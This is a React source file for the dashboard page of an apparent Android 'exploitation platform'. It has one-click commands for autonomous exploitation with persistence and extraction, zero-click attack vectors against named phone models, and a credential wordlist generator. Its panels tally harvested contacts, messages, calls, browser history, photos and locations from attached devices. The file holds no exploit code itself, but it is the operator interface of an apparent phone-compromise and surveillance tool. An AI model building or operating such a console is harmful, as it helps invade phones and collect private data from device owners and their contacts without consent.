import { useMemo, useState } from "react";
import { Link } from "wouter";
import {
  Activity, ArrowUpRight, Battery, Camera, Cpu, Database, Globe, HardDrive,
  MapPin, MessageSquare, Phone, RefreshCw, Rocket, ShieldAlert, Smartphone,
  TerminalSquare, Users, Zap,
} from "lucide-react";
import { useApi, api } from "@/lib/api";
import type {
  CommandInfo, DashboardSummary, DeviceDetail, Job, SystemInfo, ToolStatus,
  WorkflowHistoryEntry,
} from "@/lib/types";
import { useApp } from "@/state/AppContext";
import { Badge, Button, Empty, PageHeader, Panel, Progress, Stat, Terminal } from "@/components/ui";
import { useJob } from "@/components/JobDrawer";
import { formatBytes, formatNumber, formatTime, timeAgo, titleCase } from "@/lib/format";
import { ALL_NAV_ITEMS } from "@/nav";

const QUICK_COMMANDS: { name: string; args: string[]; label: string; detail: string; tags: string[] }[] = [
  {
    name: "access-autonomous",
    args: [],
    label: "access-autonomous",
    detail: "Autonomous full lifecycle — discover, exploit, persist, extract.",
    tags: ["auto", "adaptive", "self-healing"],
  },
  {
    name: "access-zero-click",
    args: [],
    label: "access-zero-click",
    detail: "Zero-click vectors: Pixel 8 modem/Wi-Fi/Titan M2/NFC, S24 Exynos, Xiaomi MIUI.",
    tags: ["zero-click", "remote", "no-user"],
  },
  {
    name: "access-vectors",
    args: [],
    label: "access-vectors",
    detail: "Enumerate every access vector and its live availability.",
    tags: ["recon", "adb", "fastboot"],
  },
  {
    name: "cve-scan",
    args: [],
    label: "cve-scan",
    detail: "Fingerprint the device and correlate against the built-in CVE database.",
    tags: ["cve", "assessment", "nvd"],
  },
  {
    name: "devices",
    args: [],
    label: "devices",
    detail: "List every ADB-attached endpoint with transport and model.",
    tags: ["adb", "inventory"],
  },
  {
    name: "passgen",
    args: [],
    label: "passgen",
    detail: "Guided wordlist generator from profile data with mutation rules.",
    tags: ["wordlist", "credentials"],
  },
];

export default function MissionControl() {
  const { system, devices, activeSerial, connected, refreshDevices } = useApp();
  const [runningJob, setRunningJob] = useState<string | null>(null);
  const [lastJob, setLastJob] = useState<Job | null>(null);

  const summary = useApi<{ summary: DashboardSummary; device: DeviceDetail; connected: boolean }>(
    activeSerial ? `/devices/${encodeURIComponent(activeSerial)}/dashboard` : null,
    { interval: 30000 },
  );
  const tools = useApi<{ tools: ToolStatus[] }>("/system/tools", { interval: 60000 });
  const workflows = useApi<{ history: WorkflowHistoryEntry[]; rates: Record<string, number> }>(
    "/workflows",
    { interval: 20000 },
  );
  const commands = useApi<{ commands: CommandInfo[] }>("/commands");

  const job = useJob(runningJob, (finished) => {
    setLastJob(finished);
    setRunningJob(null);
  });

  const toolHealth = useMemo(() => {
    const list = tools.data?.tools ?? [];
    const required = list.filter((t) => t.required === "yes");
    const available = required.filter((t) => t.available).length;
    return { list, required: required.length, available, optional: list.length - required.length };
  }, [tools.data]);

  const successRate = useMemo(() => {
    const history = workflows.data?.history ?? [];
    if (!history.length) return null;
    const wins = history.filter((run) => run.overall_success).length;
    return Math.round((wins / history.length) * 100);
  }, [workflows.data]);

  const runCommand = async (name: string, args: string[] = []) => {
    try {
      const data = await api.post<{ job: Job }>(`/commands/${name}/run`, { args });
      setRunningJob(data.job.id);
    } catch (error) {
      setLastJob({
        id: "error",
        kind: "command",
        title: name,
        status: "failed",
        progress: 0,
        createdAt: Date.now() / 1000,
        startedAt: null,
        finishedAt: null,
        durationMs: null,
        error: error instanceof Error ? error.message : String(error),
        cancelRequested: false,
        meta: {},
        output: "",
      });
    }
  };

  const counts = summary.data?.summary.counts ?? {};
  const deviceDetail = summary.data?.device ?? null;

  return (
    <div className="page">
      <PageHeader
        title="Mission Control"
        subtitle="Autonomous Android security audit & exploitation platform"
        actions={
          <>
            <Button size="sm" onClick={() => { void refreshDevices(); summary.refresh(); }}>
              <RefreshCw size={13} /> Refresh
            </Button>
            <Link href="/access" className="btn btn-primary btn-sm">
              <Rocket size={13} /> Launch access workflow
            </Link>
          </>
        }
      />

      <div className="stat-grid">
        <Stat
          value={system?.plugins ?? "—"}
          label="Plugins loaded"
          hint={`${system?.commands ?? 0} registered commands`}
          tone="info"
        />
        <Stat
          value={devices.length}
          label="Devices attached"
          hint={connected ? "ADB reachable" : "ADB unavailable"}
          tone={devices.length ? "ok" : "warn"}
        />
        <Stat
          value={counts.messages ? formatNumber(counts.messages) : "—"}
          label="Messages indexed"
          hint={counts.contacts ? `${formatNumber(counts.contacts)} contacts cached` : "collect telemetry to populate"}
        />
        <Stat
          value={successRate === null ? "—" : `${successRate}%`}
          label="Workflow success"
          hint={workflows.data?.history.length ? `${workflows.data.history.length} recorded runs` : "no runs yet"}
          tone={successRate !== null && successRate >= 60 ? "ok" : "warn"}
        />
      </div>

      {!activeSerial && (
        <Panel title="No device selected">
          <Empty
            icon={<Smartphone size={18} />}
            title="Attach an Android device over ADB"
            detail="Enable developer options → USB debugging, then connect. Wireless: adb pair <ip>:<port>."
            action={
              <div className="row" style={{ marginTop: 8 }}>
                <Link href="/devices" className="btn btn-primary btn-sm">Open devices</Link>
                <Button size="sm" onClick={() => void refreshDevices()}>Rescan</Button>
              </div>
            }
          />
        </Panel>
      )}

      {activeSerial && (
        <div className="split">
          <Panel
            title={`Device · ${deviceDetail?.model ?? activeSerial}`}
            actions={<Badge tone={summary.data?.connected ? "ok" : "warn"} dot>{summary.data?.connected ? "connected" : "cached"}</Badge>}
          >
            <div className="grid-4">
              <div className="stat info">
                <div className="stat-value" style={{ fontSize: 20 }}>
                  {deviceDetail?.androidVersion ?? "—"}
                </div>
                <div className="stat-label">Android</div>
                <div className="stat-hint">API {deviceDetail?.apiLevel ?? "—"}</div>
              </div>
              <div className="stat ok">
                <div className="stat-value" style={{ fontSize: 20 }}>
                  {deviceDetail?.batteryLevel != null ? `${deviceDetail.batteryLevel}%` : "—"}
                </div>
                <div className="stat-label">Battery</div>
                <div style={{ marginTop: 8 }}>
                  <Progress value={deviceDetail?.batteryLevel ?? 0} thin />
                </div>
              </div>
              <div className="stat">
                <div className="stat-value" style={{ fontSize: 20 }}>
                  {deviceDetail?.storageFree != null ? formatBytes(deviceDetail.storageFree) : "—"}
                </div>
                <div className="stat-label">Free storage</div>
                <div className="stat-hint">
                  of {deviceDetail?.storageTotal ? formatBytes(deviceDetail.storageTotal) : "—"}
                </div>
              </div>
              <div className="stat warn">
                <div className="stat-value" style={{ fontSize: 20 }}>
                  {deviceDetail?.isRooted ? "ROOT" : "USER"}
                </div>
                <div className="stat-label">Privilege</div>
                <div className="stat-hint">{deviceDetail?.securityPatch ?? "patch unknown"}</div>
              </div>
            </div>

            <div className="grid-4" style={{ marginTop: 14 }}>
              <MiniStat icon={<Users size={12} />} label="Contacts" value={counts.contacts} href="/contacts" />
              <MiniStat icon={<MessageSquare size={12} />} label="Messages" value={counts.messages} href="/messages" />
              <MiniStat icon={<Phone size={12} />} label="Calls" value={counts.calls} href="/calls" />
              <MiniStat icon={<Globe size={12} />} label="History" value={counts.browserEntries} href="/browser" />
              <MiniStat icon={<Camera size={12} />} label="Photos" value={counts.photos} href="/media" />
              <MiniStat icon={<Smartphone size={12} />} label="Apps" value={counts.apps} href="/apps" />
              <MiniStat icon={<MapPin size={12} />} label="Locations" value={counts.locations} href="/locations" />
              <MiniStat icon={<ShieldAlert size={12} />} label="Geofences" value={counts.geofences} href="/geofences" />
            </div>
          </Panel>

          <div className="col">
            <Panel title="System status">
              <div className="col" style={{ gap: 6 }}>
                {(system?.components ?? []).map((component) => (
                  <div className="kv" key={component.name}>
                    <span className="kv-k">{component.name}</span>
                    <span className="row" style={{ gap: 8 }}>
                      <span className="tiny mute td-truncate" style={{ maxWidth: 140 }}>{component.detail}</span>
                      <Badge
                        tone={
                          component.status === "online"
                            ? "ok"
                            : component.status === "degraded"
                              ? "warn"
                              : component.status === "unconfigured"
                                ? "warn"
                                : "dim"
                        }
                      >
                        {component.status}
                      </Badge>
                    </span>
                  </div>
                ))}
              </div>
            </Panel>

            <Panel title="Toolchain" actions={<Badge tone={toolHealth.available === toolHealth.required ? "ok" : "warn"}>
              {toolHealth.available}/{toolHealth.required} required
            </Badge>}>
              <div className="col" style={{ gap: 5 }}>
                {toolHealth.list.slice(0, 8).map((tool) => (
                  <div className="row" key={tool.key} style={{ justifyContent: "space-between" }}>
                    <span className="small">{tool.label}</span>
                    <Badge tone={tool.available ? "ok" : tool.required === "yes" ? "err" : "dim"}>
                      {tool.available ? "ready" : "missing"}
                    </Badge>
                  </div>
                ))}
              </div>
            </Panel>
          </div>
        </div>
      )}

      <Panel
        title="Command center"
        actions={<Link href="/commands" className="btn btn-sm">All commands <ArrowUpRight size={12} /></Link>}
      >
        <div className="grid-3">
          {QUICK_COMMANDS.map((command) => (
            <button
              key={command.name}
              className="cmd-card"
              onClick={() => void runCommand(command.name, command.args)}
              disabled={Boolean(runningJob)}
            >
              <div className="cmd-name">
                <span>{command.label}</span>
                <Badge tone="primary">plugin</Badge>
              </div>
              <div className="cmd-desc">{command.detail}</div>
              <div className="tag-row">
                {command.tags.map((tag) => (
                  <span className="tag" key={tag}>{tag}</span>
                ))}
              </div>
            </button>
          ))}
        </div>

        {(runningJob || lastJob) && (
          <div style={{ marginTop: 14 }}>
            <Terminal
              lines={
                runningJob
                  ? job?.output ?? "(queued…)"
                  : lastJob?.output || lastJob?.error || "(no output captured)"
              }
              title={job?.title ?? lastJob?.title ?? "command output"}
              maxHeight={220}
            />
            {!runningJob && lastJob && (
              <div className="row" style={{ marginTop: 8, gap: 8 }}>
                <Badge tone={lastJob.status === "succeeded" ? "ok" : "err"}>{lastJob.status}</Badge>
                <span className="tiny mute">{timeAgo(lastJob.finishedAt ?? lastJob.createdAt)}</span>
                <Button size="xs" variant="ghost" onClick={() => setLastJob(null)}>dismiss</Button>
              </div>
            )}
          </div>
        )}
      </Panel>

      <div className="grid-2" style={{ marginTop: 18 }}>
        <Panel title="Recent workflows" actions={<Link href="/workflows" className="btn btn-sm">Open</Link>}>
          {!workflows.data?.history.length ? (
            <Empty icon={<Rocket size={16} />} title="No workflow runs recorded" detail="Launch a lifecycle run from the Workflow Engine." />
          ) : (
            <div className="table-wrap">
              <table className="tbl">
                <thead>
                  <tr><th>Run</th><th>Target</th><th>Mode</th><th>Result</th><th>Duration</th></tr>
                </thead>
                <tbody>
                  {workflows.data.history.slice(-6).reverse().map((run, index) => (
                    <tr key={run.run_id ?? index}>
                      <td className="td-mono td-truncate">{run.run_id?.slice(0, 10) ?? "—"}</td>
                      <td className="td-truncate">{run.target ?? "—"}</td>
                      <td className="td-mono">{run.category ?? "—"}</td>
                      <td>
                        <Badge tone={run.overall_success ? "ok" : "err"}>
                          {run.overall_success ? "success" : "failed"}
                        </Badge>
                      </td>
                      <td className="td-mono">
                        {run.total_duration_ms ? `${(run.total_duration_ms / 1000).toFixed(1)}s` : "—"}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </Panel>

        <Panel title="Exploit success by vector">
          {!workflows.data?.rates || Object.keys(workflows.data.rates).length === 0 ? (
            <Empty icon={<Zap size={16} />} title="No vector telemetry yet" detail="Rates populate after the first exploit attempt." />
          ) : (
            <div className="col" style={{ gap: 10 }}>
              {Object.entries(workflows.data.rates)
                .sort((a, b) => b[1] - a[1])
                .map(([vector, rate]) => (
                  <div key={vector} className="meter">
                    <span className="tiny mono" style={{ width: 96 }}>{titleCase(vector)}</span>
                    <Progress value={rate} thin />
                    <span className="tiny mono" style={{ width: 42, textAlign: "right" }}>
                      {rate.toFixed(0)}%
                    </span>
                  </div>
                ))}
            </div>
          )}
        </Panel>
      </div>

      <Panel title="Platform surface" muted actions={<span className="tiny mute">{ALL_NAV_ITEMS.length} modules</span>}>
        <div className="grid-4">
          {ALL_NAV_ITEMS.filter((item) => item.path !== "/").map((item) => {
            const Icon = item.icon;
            return (
              <Link key={item.path} href={item.path} className="cmd-card" style={{ flexDirection: "row", alignItems: "center", gap: 10 }}>
                <Icon size={14} />
                <span className="small">{item.label}</span>
              </Link>
            );
          })}
        </div>
      </Panel>

      {!commands.data?.commands.length && (
        <Panel title="Command registry">
          <Terminal lines="Loading command registry…" title="registry" />
        </Panel>
      )}
    </div>
  );
}

function MiniStat({
  icon,
  label,
  value,
  href,
}: {
  icon: React.ReactNode;
  label: string;
  value?: number;
  href: string;
}) {
  return (
    <Link
      href={href}
      className="cmd-card"
      style={{ flexDirection: "row", alignItems: "center", justifyContent: "space-between", gap: 8 }}
    >
      <span className="row" style={{ gap: 7 }}>
        {icon}
        <span className="tiny dim">{label}</span>
      </span>
      <span className="mono strong small">{value !== undefined ? formatNumber(value) : "—"}</span>
    </Link>
  );
}
